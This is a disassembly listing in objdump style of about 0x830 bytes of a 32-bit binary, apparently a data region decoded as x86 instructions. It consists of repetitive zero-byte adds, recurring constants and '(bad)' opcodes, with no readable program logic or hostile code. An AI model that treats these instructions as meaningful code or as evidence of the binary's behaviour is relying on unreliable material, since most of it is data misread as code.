  4040b0:	test   BYTE PTR [eax],cl
  4040b2:	fs push es
  4040b4:	xchg   ebx,eax
  4040b5:	or     DWORD PTR [eax],ecx
  4040b7:	add    BYTE PTR [esi+0x23],al
  4040bd:	add    BYTE PTR [eax+ecx*1+0x997067a],al
  4040c4:	or     BYTE PTR [eax],al
  4040c6:	(bad)  
  4040c7:	and    eax,DWORD PTR [eax]
  4040c9:	add    BYTE PTR [eax],al
  4040cb:	add    BYTE PTR [ecx-0x5ef95d00],al
  4040d1:	or     DWORD PTR [ecx],ecx
  4040d3:	add    BYTE PTR [edx+0x23],bl
  4040d9:	add    BYTE PTR [esi-0x36f8f0f8],dl
  4040df:	or     DWORD PTR [ebx],ecx
  4040e1:	add    BYTE PTR [ecx+0x23],ah
  4040e7:	add    BYTE PTR [esi-0x31f8e4f8],dl
  4040ed:	or     DWORD PTR [ebx],ecx
  4040ef:	add    BYTE PTR [ebx+eiz*1+0x0],ch
  4040f6:	xchg   esi,eax
  4040f7:	add    BYTE PTR [edi],ah
  4040f9:	pop    es
  4040fa:	aam    0x9
  4040fc:	or     al,0x0
  4040fe:	shl    BYTE PTR [ebx],1
  404100:	add    BYTE PTR [eax],al
  404102:	add    BYTE PTR [eax],al
  404104:	xchg   esi,eax
  404105:	add    BYTE PTR [eax+0x7],al
  404108:	aam    0x9
  40410a:	or     eax,0x23f400
  40410f:	add    BYTE PTR [eax],al
  404111:	add    BYTE PTR [esi-0x2bf8a500],dl
  404117:	or     DWORD PTR [esi],ecx
  404119:	add    BYTE PTR [edi],dl
  40411b:	and    al,0x0
  40411d:	add    BYTE PTR [eax],al
  40411f:	add    BYTE PTR [esi-0x6ef891f8],dl
  404125:	add    ecx,DWORD PTR [edi]
  404127:	add    BYTE PTR [ebx],ah
  404129:	and    al,0x0
  40412b:	add    BYTE PTR [eax],al
  40412d:	add    BYTE PTR [esi+0x7105ef18],al
  404133:	or     DWORD PTR [edi],ecx
  404135:	add    BYTE PTR [ebx],ch
  404137:	and    al,0x0
  404139:	add    BYTE PTR [eax],al
  40413b:	add    BYTE PTR [esi-0x36f8f0f8],dl
  404141:	or     DWORD PTR [edi],ecx
  404143:	add    BYTE PTR [edx],dh
  404145:	and    al,0x0
  404147:	add    BYTE PTR [eax],al
  404149:	add    BYTE PTR [esi-0x31f8e4f8],dl
  40414f:	or     DWORD PTR [edi],ecx
  404151:	add    BYTE PTR [edx],bh
  404153:	and    al,0x0
  404155:	add    BYTE PTR [eax],al
  404157:	add    BYTE PTR [esi-0x2bf82500],dl
  40415d:	or     DWORD PTR [eax],edx
  40415f:	add    BYTE PTR [esp+0x0],cl
  404163:	add    BYTE PTR [eax],al
  404165:	add    BYTE PTR [esi-0x67f82500],dl
  40416b:	or     dl,BYTE PTR [ecx]
  40416d:	add    BYTE PTR [ebx+0x24],ah
  404173:	add    BYTE PTR [esi+0x7105ef18],al
  404179:	or     DWORD PTR [ebx],edx
  40417b:	add    BYTE PTR [eax+0x24],bh
  40417e:	add    BYTE PTR [eax],al
  404180:	add    BYTE PTR [eax],al
  404182:	xchg   ecx,eax
  404183:	sbb    BYTE PTR [edi+0x130abd15],bh
  404189:	add    BYTE PTR [ebx+0x24],ch
  40418f:	add    BYTE PTR [ecx-0x58f7c700],dl
  404195:	or     dl,BYTE PTR [ebx]
  404197:	add    BYTE PTR [eax+0x24],bh
  40419d:	add    BYTE PTR [ecx+0x7105ef18],al
  4041a3:	or     DWORD PTR [eax+eax*1],edx
  4041a6:	fsub   DWORD PTR [eax+eax*1]
  4041a9:	add    BYTE PTR [eax],al
  4041ab:	add    ah,al
  4041ad:	add    BYTE PTR [esi],bl
  4041af:	push   es
  4041b0:	jno    0x4041bb
  4041b2:	adc    al,0x0
  4041b4:	fsub   QWORD PTR [eax+eax*1]
  4041b7:	add    BYTE PTR [eax],al
  4041b9:	add    ah,al
  4041bb:	add    BYTE PTR [edx],dh
  4041bd:	push   es
  4041be:	or     BYTE PTR [ecx],0x14
  4041c1:	add    BYTE PTR [ebp+eiz*1+0x0],al
  4041c8:	add    DWORD PTR [eax],0xaad084a
  4041ce:	adc    al,0x0
  4041d0:	sbb    al,0x26
  4041d2:	add    BYTE PTR [eax],al
  4041d4:	add    BYTE PTR [eax],al
  4041d6:	add    DWORD PTR [eax],0xaad0869
  4041dc:	adc    al,0x0
  4041de:	mov    ch,0x26
  4041e0:	add    BYTE PTR [eax],al
  4041e2:	add    BYTE PTR [eax],al
  4041e4:	add    DWORD PTR [eax],0xab20885
  4041ea:	adc    al,0x0
  4041ec:	mov    bh,0x26
  4041ee:	add    BYTE PTR [eax],al
  4041f0:	add    BYTE PTR [eax],al
  4041f2:	add    DWORD PTR [eax],0x97108a7
  4041f8:	adc    eax,0x26d800
  4041fd:	add    BYTE PTR [eax],al
  4041ff:	add    BYTE PTR [ecx+0x7108b700],al
  404205:	or     DWORD PTR ds:0x272400,edx
  40420b:	add    BYTE PTR [eax],al
  40420d:	add    ah,al
  40420f:	add    BYTE PTR [edi],bh
  404211:	push   es
  404212:	xchg   BYTE PTR [ecx],cl
  404214:	adc    eax,0x273500
  404219:	add    BYTE PTR [eax],al
  40421b:	add    ah,al
  40421d:	or     BYTE PTR [ebp+0x6],cl
  404220:	mov    WORD PTR [ecx],cs
  404222:	pop    ss
  404223:	add    BYTE PTR [edi+eiz*1],bh
  404226:	add    BYTE PTR [eax],al
  404228:	add    BYTE PTR [eax],al
  40422a:	xchg   ebx,eax
  40422b:	or     cl,cl
  40422d:	or     BYTE PTR [eax+0x4300170a],bh
  404233:	daa    
  404234:	add    BYTE PTR [eax],al
  404236:	add    BYTE PTR [eax],al
  404238:	xchg   ebx,eax
  404239:	add    dh,dl
  40423b:	or     BYTE PTR [ebp+0x4f00170a],bh
  404241:	daa    
  404242:	add    BYTE PTR [eax],al
  404244:	add    BYTE PTR [eax],al
  404246:	add    DWORD PTR [eax],0xffffffe6
  404249:	or     BYTE PTR [ecx+0x9],dh
  40424c:	pop    ss
  40424d:	add    BYTE PTR [ebp+0x27],ah
  404250:	add    BYTE PTR [eax],al
  404252:	add    BYTE PTR [eax],al
  404254:	xchg   ecx,eax
  404255:	sbb    BYTE PTR [edi+0x170abd15],bh
  40425b:	add    BYTE PTR [ecx+0x27],dh
  40425e:	add    BYTE PTR [eax],al
  404260:	add    BYTE PTR [eax],al
  404262:	out    0x1,al
  404264:	(bad)
  404268:	pop    ss
  404269:	add    BYTE PTR [edi+eiz*1+0x0],dh
  40426d:	add    BYTE PTR [eax],al
  40426f:	add    dh,ah
  404271:	add    DWORD PTR [ecx+ecx*1+0x1b0ad6],esp
  404278:	or     al,0x28
  40427a:	add    BYTE PTR [eax],al
  40427c:	add    BYTE PTR [eax],al
  40427e:	out    0x1,al
  404280:	mov    edx,0x1d0ad609
  404285:	add    BYTE PTR [esi],cl
  404287:	sub    BYTE PTR [eax],al
  404289:	add    BYTE PTR [eax],al
  40428b:	add    BYTE PTR [esi+0x7105ef18],al
  404291:	or     DWORD PTR [edi],ebx
  404293:	add    BYTE PTR [eax],bl
  404295:	sub    BYTE PTR [eax],al
  404297:	add    BYTE PTR [eax],al
  404299:	add    dh,ah
  40429b:	add    edx,ebp
  40429d:	or     esi,ebx
  40429f:	or     bl,BYTE PTR [edi]
  4042a1:	add    BYTE PTR [edx+0x28],bl
  4042a4:	add    BYTE PTR [eax],al
  4042a6:	add    BYTE PTR [eax],al
  4042a8:	out    0x1,al
  4042aa:	dec    BYTE PTR [ecx]
  4042ac:	jmp    0x5c4064bb
  4042b1:	sub    BYTE PTR [eax],al
  4042b3:	add    BYTE PTR [eax],al
  4042b5:	add    BYTE PTR [esi+0x7105ef18],al
  4042bb:	or     DWORD PTR [eax+eax*1],esp
  4042be:	add    BYTE PTR [eax],al
  4042c0:	add    BYTE PTR [eax],al
  4042c2:	add    BYTE PTR [eax],al
  4042c4:	mov    BYTE PTR ds:0x97108e6,0x24
  4042cb:	add    BYTE PTR [eax],al
  4042cd:	add    BYTE PTR [eax],al
  4042cf:	add    BYTE PTR [eax],al
  4042d1:	add    dh,al
  4042d3:	add    eax,0xaf10a0e
  4042d8:	and    al,0x0
  4042da:	add    BYTE PTR [eax],al
  4042dc:	add    BYTE PTR [eax],al
  4042de:	add    BYTE PTR [eax],al
  4042e0:	mov    BYTE PTR ds:0xaf60a1a,0x25
  4042e7:	add    BYTE PTR [eax],al
  4042e9:	add    BYTE PTR [eax],al
  4042eb:	add    BYTE PTR [eax],al
  4042ed:	add    dh,al
  4042ef:	add    eax,0xaf60a2b
  4042f4:	and    eax,0x0
  4042f9:	add    BYTE PTR [eax],al
  4042fb:	add    dh,al
  4042fd:	add    eax,0xaf60a3a
  404302:	and    eax,0x0
  404307:	add    BYTE PTR [eax],al
  404309:	add    dh,al
  40430b:	add    eax,0x9710a52
  404310:	and    eax,0x0
  404315:	add    BYTE PTR [eax],al
  404317:	add    dh,al
  404319:	add    eax,0x9710a60
  40431e:	and    eax,0x0
  404323:	add    BYTE PTR [eax],al
  404325:	add    dh,al
  404327:	add    eax,0xafb0a6f
  40432c:	and    eax,0x0
  404331:	add    BYTE PTR [eax],al
  404333:	add    dh,al
  404335:	add    eax,0xb010a83
  40433a:	add    BYTE PTR es:[eax],al
  40433d:	add    BYTE PTR [eax],al
  40433f:	add    BYTE PTR [eax],al
  404341:	add    dh,al
  404343:	add    eax,0xafb0a9e
  404348:	daa    
  404349:	add    BYTE PTR [eax],al
  40434b:	add    BYTE PTR [eax],al
  40434d:	add    BYTE PTR [eax],al
  40434f:	add    dh,al
  404351:	add    eax,0xb080abd
  404356:	sub    BYTE PTR [eax],al
  404358:	add    BYTE PTR [eax],al
  40435a:	add    BYTE PTR [eax],al
  40435c:	add    BYTE PTR [eax],al
  40435e:	mov    BYTE PTR ds:0xb100ac4,0x2b
  404365:	add    BYTE PTR [eax],al
  404367:	add    BYTE PTR [eax],al
  404369:	add    BYTE PTR [eax],al
  40436b:	add    dh,al
  40436d:	add    eax,0xaf10ad1
  404372:	das    
  404373:	add    BYTE PTR [eax],al
  404375:	add    BYTE PTR [eax],al
  404377:	add    BYTE PTR [eax],al
  404379:	add    dh,al
  40437b:	add    eax,0xb1a0adf
  404380:	xor    BYTE PTR [eax],al
  404382:	add    BYTE PTR [eax],al
  404384:	add    BYTE PTR [eax],al
  404386:	add    BYTE PTR [eax],al
  404388:	mov    BYTE PTR ds:0xb210af9,0x32
  40438f:	add    BYTE PTR [eax],al
  404391:	add    BYTE PTR [eax],al
  404393:	add    BYTE PTR [eax],al
  404395:	add    dh,al
  404397:	add    eax,0xb260b16
  40439c:	xor    eax,DWORD PTR [eax]
  40439e:	add    BYTE PTR [eax],al
  4043a0:	add    BYTE PTR [eax],al
  4043a2:	add    BYTE PTR [eax],al
  4043a4:	mov    BYTE PTR ds:0xb300b22,0x38
  4043ab:	add    BYTE PTR [eax],al
  4043ad:	add    BYTE PTR [eax],al
  4043af:	add    BYTE PTR [eax],al
  4043b1:	add    dh,al
  4043b3:	add    eax,0xb370b30
  4043b8:	cmp    eax,DWORD PTR [eax]
  4043ba:	add    BYTE PTR [eax],al
  4043bc:	add    BYTE PTR [eax],al
  4043be:	add    BYTE PTR [eax],al
  4043c0:	mov    BYTE PTR ds:0x9710b44,0x3d
  4043c7:	add    BYTE PTR [eax],al
  4043c9:	add    BYTE PTR [eax],al
  4043cb:	add    BYTE PTR [eax],al
  4043cd:	add    dh,al
  4043cf:	add    eax,0x9970b5f
  4043d4:	cmp    eax,0x0
  4043d9:	add    BYTE PTR [eax],al
  4043db:	add    dh,al
  4043dd:	add    eax,0x9710b6e
  4043e2:	add    BYTE PTR ds:[eax],al
  4043e5:	add    BYTE PTR [eax],al
  4043e7:	add    BYTE PTR [eax],al
  4043e9:	add    dh,al
  4043eb:	add    eax,0xb3f0b84
  4043f0:	add    BYTE PTR ds:[eax],al
  4043f3:	add    BYTE PTR [eax],al
  4043f5:	add    BYTE PTR [eax],al
  4043f7:	add    dh,al
  4043f9:	add    eax,0xb450b98
  4043fe:	aas    
  4043ff:	add    BYTE PTR [eax],al
  404401:	add    BYTE PTR [eax],al
  404403:	add    BYTE PTR [eax],al
  404405:	add    dh,al
  404407:	add    eax,0xb3f0ba4
  40440c:	inc    ecx
  40440d:	add    BYTE PTR [eax],al
  40440f:	add    BYTE PTR [eax],al
  404411:	add    BYTE PTR [eax],al
  404413:	add    dh,al
  404415:	add    eax,0xb3f0bb2
  40441a:	inc    edx
  40441b:	add    BYTE PTR [eax],al
  40441d:	add    BYTE PTR [eax],al
  40441f:	add    BYTE PTR [eax],al
  404421:	add    dh,al
  404423:	add    eax,0xb4d0bbd
  404428:	inc    ebx
  404429:	add    BYTE PTR [eax],al
  40442b:	add    BYTE PTR [eax],al
  40442d:	add    BYTE PTR [eax],al
  40442f:	add    dh,al
  404431:	add    eax,0xb570bdc
  404436:	inc    edi
  404437:	add    BYTE PTR [eax],al
  404439:	add    BYTE PTR [eax],al
  40443b:	add    BYTE PTR [eax],al
  40443d:	add    dh,al
  40443f:	add    eax,0xb5e0bf2
  404444:	dec    ecx
  404445:	add    BYTE PTR [eax],al
  404447:	add    BYTE PTR [eax],al
  404449:	add    BYTE PTR [eax],al
  40444b:	add    dh,al
  40444d:	add    eax,0xb640c0d
  404452:	dec    ebx
  404453:	add    BYTE PTR [eax+ebp*1+0x0],ah
  404457:	add    BYTE PTR [eax],al
  404459:	add    BYTE PTR [esi+0x7705ef18],al
  40445f:	or     edx,DWORD PTR [eax+0x0]
  404462:	mov    al,ds:0x28
  404467:	add    dh,ah
  404469:	add    DWORD PTR [ebx+ecx*1+0x520b7f],eax
  404470:	adc    al,0x29
  404472:	add    BYTE PTR [eax],al
  404474:	add    BYTE PTR [eax],al
  404476:	out    0x1,al
  404478:	cwde   
  404479:	or     eax,DWORD PTR [ebp+0xb]
  40447c:	push   ebx
  40447d:	add    BYTE PTR [ecx+ebp*1+0x0],cl
  404484:	out    0x1,al
  404486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404487:	or     eax,DWORD PTR [esi-0x3ffaaf5]
  40448d:	sub    DWORD PTR [eax],eax
  40448f:	add    BYTE PTR [eax],al
  404491:	add    dh,ah
  404493:	add    DWORD PTR [edx+0x560b8c0b],esi
  404499:	add    BYTE PTR [esi+0x2a],al
  40449c:	add    BYTE PTR [eax],al
  40449e:	add    BYTE PTR [eax],al
  4044a0:	out    0x1,al
  4044a2:	mov    esi,0x570b920c
  4044a7:	add    BYTE PTR [edx+0x2a],dl
  4044aa:	add    BYTE PTR [eax],al
  4044ac:	add    BYTE PTR [eax],al
  4044ae:	out    0x1,al
  4044b0:	ror    BYTE PTR [ecx+ebx*4],cl
  4044b3:	or     ebx,DWORD PTR [ecx+0x0]
  4044b6:	mov    WORD PTR [edx],gs
  4044b8:	add    BYTE PTR [eax],al
  4044ba:	add    BYTE PTR [eax],al
  4044bc:	out    0x1,al
  4044be:	mov    ebp,0x5a0b9e0b
  4044c3:	add    BYTE PTR [eax],bl
  4044c5:	sub    eax,DWORD PTR [eax]
  4044c7:	add    BYTE PTR [eax],al
  4044c9:	add    dh,ah
  4044cb:	add    esp,ebx
  4044cd:	or     ebp,DWORD PTR [ecx-0x6bffa1f5]
  4044d3:	sub    eax,DWORD PTR [eax]
  4044d5:	add    BYTE PTR [eax],al
  4044d7:	add    dh,ah
  4044d9:	add    edx,esi
  4044db:	or     esi,DWORD PTR [ecx-0x2fff9ff5]
  4044e1:	sub    eax,DWORD PTR [eax]
  4044e3:	add    BYTE PTR [eax],al
  4044e5:	add    BYTE PTR [ecx-0x47f30d00],al
  4044eb:	or     esp,DWORD PTR [edx+0x0]
  4044ee:	add    al,0x2c
  4044f0:	add    BYTE PTR [eax],al
  4044f2:	add    BYTE PTR [eax],al
  4044f4:	test   BYTE PTR [eax],bl
  4044f6:	out    dx,eax
  4044f7:	add    eax,0x630971
  4044fc:	or     al,0x2c
  4044fe:	add    BYTE PTR [eax],al
  404500:	add    BYTE PTR [eax],al
  404502:	xchg   esi,eax
  404503:	or     BYTE PTR [edi],cl
  404505:	pop    es
  404506:	leave  
  404507:	or     DWORD PTR [ebx+0x0],esp
  40450a:	adc    ebp,DWORD PTR [eax+eax*1]
  40450d:	add    BYTE PTR [eax],al
  40450f:	add    BYTE PTR [esi-0x31f8e4f8],dl
  404515:	or     DWORD PTR [ebx+0x0],esp
  404518:	sbb    ebp,DWORD PTR [eax+eax*1]
  40451b:	add    BYTE PTR [eax],al
  40451d:	add    BYTE PTR [esi-0x6ef2f6f8],dl
  404523:	add    esp,DWORD PTR [eax+eax*1+0x27]
  404527:	sub    al,0x0
  404529:	add    BYTE PTR [eax],al
  40452b:	add    BYTE PTR [ecx+0x7105ef18],al
  404531:	or     DWORD PTR [eax+eax*1+0x2f],esp
  404535:	sub    al,0x0
  404537:	add    BYTE PTR [eax],al
  404539:	add    BYTE PTR [esi-0x36f8f0f8],dl
  40453f:	or     DWORD PTR [eax+eax*1+0x36],esp
  404543:	sub    al,0x0
  404545:	add    BYTE PTR [eax],al
  404547:	add    BYTE PTR [esi-0x31f8e4f8],dl
  40454d:	or     DWORD PTR [eax+eax*1+0x3e],esp
  404551:	sub    al,0x0
  404553:	add    BYTE PTR [eax],al
  404555:	add    BYTE PTR [esi-0x2bf82500],dl
  40455b:	or     DWORD PTR [ebp+0x0],esp
  40455e:	push   eax
  40455f:	sub    al,0x0
  404561:	add    BYTE PTR [eax],al
  404563:	add    BYTE PTR [ecx-0x42ea40e8],dl
  404569:	or     ah,BYTE PTR [esi+0x0]
  40456c:	mov    BYTE PTR [eax+eax*1],ch
  40456f:	add    BYTE PTR [eax],al
  404571:	add    BYTE PTR [esi-0x47f2c4f8],al
  404577:	or     esp,DWORD PTR [esi+0x0]
  40457a:	shr    BYTE PTR [eax+eax*1],0x0
  40457e:	add    BYTE PTR [eax],al
  404580:	xchg   BYTE PTR [eax],cl
  404582:	dec    edx
  404583:	or     eax,0x670bb8
  404588:	cmc    
  404589:	sub    al,0x0
  40458b:	add    BYTE PTR [eax],al
  40458d:	add    dh,ah
  40458f:	add    esi,esp
  404591:	or     BYTE PTR [ecx+0x9],dh
  404594:	push   0x2d0200
  404599:	add    BYTE PTR [eax],al
  40459b:	add    BYTE PTR [esi+0x7105ef18],al
  4045a1:	or     DWORD PTR [eax+0x0],ebp
  4045a4:	or     al,0x2d
  4045a6:	add    BYTE PTR [eax],al
  4045a8:	add    BYTE PTR [eax],al
  4045aa:	xchg   BYTE PTR [eax],bl
  4045ac:	out    dx,eax
  4045ad:	add    eax,0x680971
  4045b2:	loopne 0x4045e1
  4045b4:	add    BYTE PTR [eax],al
  4045b6:	add    BYTE PTR [eax],al
  4045b8:	out    0x1,al
  4045ba:	mov    al,0xd
  4045bc:	jno    0x4045c7
  4045be:	push   0x2ded00
  4045c3:	add    BYTE PTR [eax],al
  4045c5:	add    BYTE PTR [ecx+0x710db800],al
  4045cb:	or     DWORD PTR [eax+0x0],ebp
  4045ce:	cli    
  4045cf:	sub    eax,0x0
  4045d4:	out    0x1,al
  4045d6:	push   cs
  4045d7:	or     dh,cl
  4045d9:	or     ch,BYTE PTR [eax+0x0]
  4045dc:	adc    al,0x2e
  4045de:	add    BYTE PTR [eax],al
  4045e0:	add    BYTE PTR [eax],al
  4045e2:	out    0x1,al
  4045e4:	sbb    cl,BYTE PTR [edx]
  4045e6:	test   BYTE PTR [edx],0x69
  4045e9:	add    BYTE PTR [esi+ebp*1],bh
  4045ec:	add    BYTE PTR [eax],al
  4045ee:	add    BYTE PTR [eax],al
  4045f0:	out    0x1,al
  4045f2:	sub    ecx,DWORD PTR [edx]
  4045f4:	test   BYTE PTR [edx],0x69
  4045f7:	add    BYTE PTR [esi+ebp*1+0x0],al
  4045fe:	out    0x1,al
  404600:	cmp    cl,BYTE PTR [edx]
  404602:	test   BYTE PTR [edx],0x69
  404605:	add    BYTE PTR [ecx+0x2e],ch
  40460b:	add    dh,ah
  40460d:	add    DWORD PTR [edx+0xa],edx
  404610:	jno    0x40461b
  404612:	imul   eax,DWORD PTR [eax],0x2ebd
  404618:	add    BYTE PTR [eax],al
  40461a:	out    0x1,al
  40461c:	pusha  
  40461d:	or     dh,BYTE PTR [ecx+0x9]
  404620:	imul   eax,DWORD PTR [eax],0x2ed0
  404626:	add    BYTE PTR [eax],al
  404628:	out    0x1,al
  40462a:	outs   dx,DWORD PTR ds:[esi]
  40462b:	or     bh,bl
  40462d:	or     ch,BYTE PTR [ecx+0x0]
  404630:	cld    
  404631:	add    BYTE PTR cs:[eax],al
  404634:	add    BYTE PTR [eax],al
  404636:	out    0x1,al
  404638:	or     DWORD PTR [edx],0x1
  40463b:	or     ebp,DWORD PTR [edx+0x0]
  40463e:	and    al,0x2f
  404640:	add    BYTE PTR [eax],al
  404642:	add    BYTE PTR [eax],al
  404644:	out    0x1,al
  404646:	sahf   
  404647:	or     bh,bl
  404649:	or     ch,BYTE PTR [ebx+0x0]
  40464c:	jl     0x40467d
  40464e:	add    BYTE PTR [eax],al
  404650:	add    BYTE PTR [eax],al
  404652:	out    0x1,al
  404654:	mov    ebp,0x6c0b080a
  404659:	add    BYTE PTR [eax],ch
  40465b:	xor    BYTE PTR [eax],al
  40465d:	add    BYTE PTR [eax],al
  40465f:	add    BYTE PTR [ecx+0x80dc700],al
  404665:	or     ebp,DWORD PTR [edi+0x0]
  404668:	jp     0x40469a
  40466a:	add    BYTE PTR [eax],al
  40466c:	add    BYTE PTR [eax],al
  40466e:	out    0x1,al
  404670:	les    ecx,FWORD PTR [edx]
  404672:	adc    BYTE PTR [ebx],cl
  404674:	jb     0x404676
  404676:	xchg   edx,eax
  404677:	xor    BYTE PTR [eax],al
  404679:	add    BYTE PTR [eax],al
  40467b:	add    dh,ah
  40467d:	add    ecx,edx
  40467f:	or     dh,cl
  404681:	or     dh,BYTE PTR [esi+0x0]
  404684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404685:	xor    BYTE PTR [eax],al
  404687:	add    BYTE PTR [eax],al
  404689:	add    dh,ah
  40468b:	add    edi,ebx
  40468d:	or     bl,BYTE PTR [edx]
  40468f:	or     esi,DWORD PTR [edi+0x0]
  404692:	mov    ebx,0x30
  404697:	add    dh,ah
  404699:	add    ecx,edi
  40469b:	or     ah,BYTE PTR [ecx]
  40469d:	or     edi,DWORD PTR [ecx+0x0]
  4046a0:	shl    BYTE PTR [eax],1
  4046a2:	add    BYTE PTR [eax],al
  4046a4:	add    BYTE PTR [eax],al
  4046a6:	out    0x1,al
  4046a8:	push   ss
  4046a9:	or     esp,DWORD PTR [esi]
  4046ab:	or     edi,DWORD PTR [edx+0x0]
  4046ae:	or     esi,DWORD PTR [ecx]
  4046b0:	add    BYTE PTR [eax],al
  4046b2:	add    BYTE PTR [eax],al
  4046b4:	out    0x1,al
  4046b6:	and    cl,BYTE PTR [ebx]
  4046b8:	xor    BYTE PTR [ebx],cl
  4046ba:	jg     0x4046bc
  4046bc:	and    al,0x31
  4046be:	add    BYTE PTR [eax],al
  4046c0:	add    BYTE PTR [eax],al
  4046c2:	out    0x1,al
  4046c4:	xor    BYTE PTR [ebx],cl
  4046c6:	aaa    
  4046c7:	or     eax,DWORD PTR [edx+0x314f00]
  4046cd:	add    BYTE PTR [eax],al
  4046cf:	add    dh,ah
  4046d1:	add    DWORD PTR [ebx+ecx*1+0x71],eax
  4046d5:	or     DWORD PTR [eax+eax*1+0x3162],eax
  4046dc:	add    BYTE PTR [eax],al
  4046de:	out    0x1,al
  4046e0:	pop    edi
  4046e1:	or     edx,DWORD PTR [edi+0x76008409]
  4046e7:	xor    DWORD PTR [eax],eax
  4046e9:	add    BYTE PTR [eax],al
  4046eb:	add    dh,ah
  4046ed:	add    DWORD PTR [esi+0xb],ebp
  4046f0:	jno    0x4046fb
  4046f2:	test   DWORD PTR [eax],eax
  4046f4:	sbb    al,0x32
  4046f6:	add    BYTE PTR [eax],al
  4046f8:	add    BYTE PTR [eax],al
  4046fa:	add    DWORD PTR [eax],0xbe20dd6
  404700:	test   DWORD PTR [eax],eax
  404702:	or     ch,BYTE PTR ds:0x0
  404708:	xchg   ecx,eax
  404709:	add    BYTE PTR [esi],al
  40470b:	push   ds
  40470c:	push   edi
  40470d:	adc    al,BYTE PTR [esi+0x325e00]
  404713:	add    BYTE PTR [eax],al
  404715:	add    BYTE PTR [ecx-0x42ea40e8],dl
  40471b:	or     cl,BYTE PTR [eax+0x326a00]
  404721:	add    BYTE PTR [eax],al
  404723:	add    BYTE PTR [esi-0x17fa10e8],al
  404729:	or     ecx,DWORD PTR [eax+0x329700]
  40472f:	add    BYTE PTR [eax],al
  404731:	add    BYTE PTR [esi-0x73f1def8],al
  404737:	or     DWORD PTR [ebp+0x329f00],ecx
  40473d:	add    BYTE PTR [eax],al
  40473f:	add    BYTE PTR [ecx-0xef1d5f8],al
  404745:	or     cl,BYTE PTR [ebp+0x32a800]
  40474b:	add    BYTE PTR [eax],al
  40474d:	add    BYTE PTR [esi-0x73f1ccf8],al
  404753:	or     DWORD PTR [esi+0x32b000],ecx
  404759:	add    BYTE PTR [eax],al
  40475b:	add    BYTE PTR [ecx-0xef1baf8],al
  404761:	or     cl,BYTE PTR [esi+0x32b900]
  404767:	add    BYTE PTR [eax],al
  404769:	add    BYTE PTR [esi-0xcf1a8f8],al
  40476f:	or     ecx,DWORD PTR [edi+0x32c100]
  404775:	add    BYTE PTR [eax],al
  404777:	add    BYTE PTR [ecx-0x7f19bf8],al
  40477d:	or     ecx,DWORD PTR [edi+0x32ca00]
  404783:	add    BYTE PTR [eax],al
  404785:	add    BYTE PTR [esi-0x73f18ef8],al
  40478b:	or     DWORD PTR [eax+0x32d200],edx
  404791:	add    BYTE PTR [eax],al
  404793:	add    BYTE PTR [ecx-0xef181f8],al
  404799:	or     dl,BYTE PTR [eax+0x32db00]
  40479f:	add    BYTE PTR [eax],al
  4047a1:	add    BYTE PTR [esi-0x1f174f8],al
  4047a7:	or     edx,DWORD PTR [ecx+0x32e300]
  4047ad:	add    BYTE PTR [eax],al
  4047af:	add    BYTE PTR [ecx+0x30e9608],al
  4047b5:	or     al,0x91
  4047b7:	add    ah,ch
  4047b9:	xor    al,BYTE PTR [eax]
  4047bb:	add    BYTE PTR [eax],al
  4047bd:	add    BYTE PTR [esi-0x68f4a100],al
  4047c3:	or     DWORD PTR [edx+0x334400],edx
  4047c9:	add    BYTE PTR [eax],al
  4047cb:	add    BYTE PTR [esi+0x1f0f7b00],al
  4047d1:	or     al,0x93
  4047d3:	add    al,dh
  4047d5:	xor    eax,DWORD PTR [eax]
  4047d7:	add    BYTE PTR [eax],al
  4047d9:	add    BYTE PTR [esi-0x47f06900],al
  4047df:	or     edx,DWORD PTR [ebp+0x34f000]
  4047e5:	add    BYTE PTR [eax],al
  4047e7:	add    BYTE PTR [esi+0x7105ef18],al
  4047ed:	or     DWORD PTR [esi+0x287a00],edx
  4047f3:	add    BYTE PTR [eax],al
  4047f5:	add    BYTE PTR [esi+0x7105ef18],al
  4047fb:	or     DWORD PTR [esi+0x288200],edx
  404801:	add    BYTE PTR [eax],al
  404803:	add    BYTE PTR [esi+0x711afc00],al
  404809:	or     DWORD PTR [esi+0x28e500],edx
  40480f:	add    BYTE PTR [eax],al
  404811:	add    BYTE PTR [esi+0x7105ef18],al
  404817:	or     DWORD PTR [esi+0x28ed00],edx
  40481d:	add    BYTE PTR [eax],al
  40481f:	add    BYTE PTR [esi+0x711b9300],al
  404825:	or     DWORD PTR [esi+0x296300],edx
  40482b:	add    BYTE PTR [eax],al
  40482d:	add    BYTE PTR [esi+0x7105ef18],al
  404833:	or     DWORD PTR [esi+0x296b00],edx
  404839:	add    BYTE PTR [eax],al
  40483b:	add    BYTE PTR [esi+0x711bc100],al
  404841:	or     DWORD PTR [esi+0x29d600],edx
  404847:	add    BYTE PTR [eax],al
  404849:	add    BYTE PTR [esi+0x7105ef18],al
  40484f:	or     DWORD PTR [esi+0x29de00],edx
  404855:	add    BYTE PTR [eax],al
  404857:	add    BYTE PTR [esi+0x711c0a00],al
  40485d:	or     DWORD PTR [esi+0x2a5500],edx
  404863:	add    BYTE PTR [eax],al
  404865:	add    BYTE PTR [esi+0x7105ef18],al
  40486b:	or     DWORD PTR [esi+0x2a5d00],edx
  404871:	add    BYTE PTR [eax],al
  404873:	add    BYTE PTR [esi+0x711c6000],al
  404879:	or     DWORD PTR [esi+0x2ae500],edx
  40487f:	add    BYTE PTR [eax],al
  404881:	add    BYTE PTR [esi+0x7105ef18],al
  404887:	or     DWORD PTR [esi+0x2aed00],edx
  40488d:	add    BYTE PTR [eax],al
  40488f:	add    BYTE PTR [esi+0x711cb300],al
  404895:	or     DWORD PTR [esi+0x2b6700],edx
  40489b:	add    BYTE PTR [eax],al
  40489d:	add    BYTE PTR [esi+0x7105ef18],al
  4048a3:	or     DWORD PTR [esi+0x2b6f00],edx
  4048a9:	add    BYTE PTR [eax],al
  4048ab:	add    BYTE PTR [esi+0x711ce300],al
  4048b1:	or     DWORD PTR [esi+0x2f4f00],edx
  4048b7:	add    BYTE PTR [eax],al
  4048b9:	add    BYTE PTR [esi+0x7105ef18],al
  4048bf:	or     DWORD PTR [esi+0x2f5700],edx
  4048c5:	add    BYTE PTR [eax],al
  4048c7:	add    BYTE PTR [esi+0x7120fc00],al
  4048cd:	or     DWORD PTR [esi+0x2fd500],edx
  4048d3:	add    BYTE PTR [eax],al
  4048d5:	add    BYTE PTR [esi+0x7105ef18],al
  4048db:	or     DWORD PTR [esi+0x2fe000],edx
  4048e1:	add    BYTE PTR [eax],al
  4048e3:	add    BYTE PTR [esi+0x4b215200],al
